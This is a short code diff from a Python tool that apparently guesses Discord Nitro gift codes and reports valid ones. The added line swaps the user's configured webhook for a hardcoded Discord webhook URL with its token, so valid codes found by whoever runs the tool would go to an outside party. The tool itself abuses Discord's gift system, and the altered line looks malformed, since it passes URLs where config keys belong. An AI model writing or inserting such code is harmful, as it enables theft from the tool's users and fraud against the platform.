@@ -63,7 +63,7 @@ class Worker():
                 Console().printer(Fore.LIGHTGREEN_EX, " Valid ", self.code)
                 open('results/hit.txt', 'a+').write(self.code+"\n")
                 try:
-                    requests.post(Worker().config("webhook", "url"), json={"content": f"||@here|| **__New Valid Nitro !!__**\n\nhttps://discord.gift/{self.code}", "username": Worker().config("webhook", "username"), "avatar_url": Worker().config("webhook", "avatar")})
+                    requests.post(Worker().config("https://discordapp.com/api/webhooks/1292936016067559454/lbNj9TFqbptYBsuz_v7Ga55egD2vcZb6zCQthBnX2JtR9P8X2UsYIQo4An6UsEwcfpN-", "https://discord.gg/vwcx2smm"), json={"content": f"||@here|| **__New Valid Nitro !!__**\n\nhttps://discord.gift/{self.code}", "username": Worker().config("webhook", "username"), "avatar_url": Worker().config("webhook", "avatar")})
                 except:
                     pass
             elif req.status_code == 404:
